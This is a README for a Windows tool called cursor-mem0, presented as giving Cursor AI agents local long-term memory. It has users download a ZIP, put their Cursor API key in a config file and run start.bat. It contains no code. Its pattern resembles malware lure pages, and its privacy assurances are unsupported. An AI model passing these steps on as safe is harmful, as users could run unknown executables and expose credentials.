# 🧠 cursor-mem0 - Give your AI agent long-term memory

[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/Konstantincoldeyed787/cursor-mem0)

This application adds long-term memory to your AI agents inside the Cursor code editor. It lets your AI remember your previous work and preferences across different coding sessions. It uses local storage methods to keep your data private and secure.

## 📥 Getting Started

To use this software, visit the main project page to download the latest files.

[Download cursor-mem0 here](https://github.com/Konstantincoldeyed787/cursor-mem0)

Follow these steps to set up the software on your Windows computer.

## 💻 System Requirements

You need a Windows 10 or Windows 11 computer to run this tool. Ensure you have at least 4GB of free hard drive space. You must have the Cursor IDE installed on your machine. You will also need a valid CURSOR_API_KEY from your account settings.

## ⚙️ Installation Steps

1. Visit the repository link provided above.
2. Click the green button labeled Code.
3. Select Download ZIP.
4. Save this file to your computer.
5. Create a new folder on your desktop and name it cursor-mem0.
6. Open the ZIP file and move the contents into this new folder.
7. Unzip the files inside the folder.

## 🔑 Initial Configuration

The software requires a connection key to talk to the Cursor editor.

1. Open the folder you created on your desktop.
2. Find the file named config.env.
3. Open this file using Notepad.
4. Locate the line that says CURSOR_API_KEY.
5. Replace the placeholder text with your actual key from the Cursor settings menu.
6. Save the file and close Notepad.

## 🚀 Running the Application

This tool runs as a background service to support your AI.

1. Open the folder where you saved the files.
2. Locate the file named start.bat.
3. Double-click this file.
4. A black command window will appear on your screen.
5. This window shows the status of your AI memory. 
6. Keep this window open while you work in Cursor. 
7. If you close the window, the memory service stops.

## 🛠️ How it Works

The application creates a local database on your computer. When you ask your AI a question, it checks this database for past notes. This process happens on your machine. Your data does not leave your computer. 

The software uses several technologies to manage this data:
* Vector search: This helps the computer find related notes quickly.
* Local embeddings: This turns your text into a format the AI understands.
* SQLite: This stores your notes in a stable file format.
* Qdrant: This engine manages the search index for your memories.

## 🔍 Troubleshooting Common Issues

If the software fails to start, check these items.

### The Window Closes Immediately
Ensure you saved your API key correctly in the config file. A missing or incorrect key prevents the software from starting. Check that you copied the full key from your Cursor account.

### The AI Does Not Remember Tasks
Restart the application to refresh the connection. Ensure your Cursor IDE is active and running. The AI only remembers sessions that started after you launched the memory service.

### High Memory Usage
This tool runs local processes to manage your data. Close other heavy programs if your computer feels slow. The application uses only the resources it needs to provide fast search results.

## 🌐 Updating the Software

Check the repository page regularly for updates. If a new version exists, delete your old files and download the new ones. Move your existing database file to the new folder to keep your memories. The database file is named memory.db. Transferring this file allows you to maintain history across different versions of the software.

## 🛡️ Data Privacy

You own your data. This software stores information inside your local file system. It does not send your notes to external web servers. The local database format ensures that you remain the only user with access to your knowledge base. You can delete the memory.db file at any time to clear your agent memory entirely. This action is permanent and cannot be undone.

## 📋 Best Practices for Better Memory

The AI performs best when you provide clear descriptions of your work. Summarize specific coding patterns or project structures in your chat. The system saves these summaries as context. Over time, the AI learns your preferences for formatting, library choices, and project organization. Keep your file names descriptive to help the search engine index your project correctly.

## 🎓 Support

This tool is designed to work as a standalone helper. Use the issue tracker on the repository website if you find errors. Provide the text from your black command window when reporting a problem. This helps developers identify the cause of the issue. Do not share your API key in public forums or issue reports. Keep your key confidential at all times.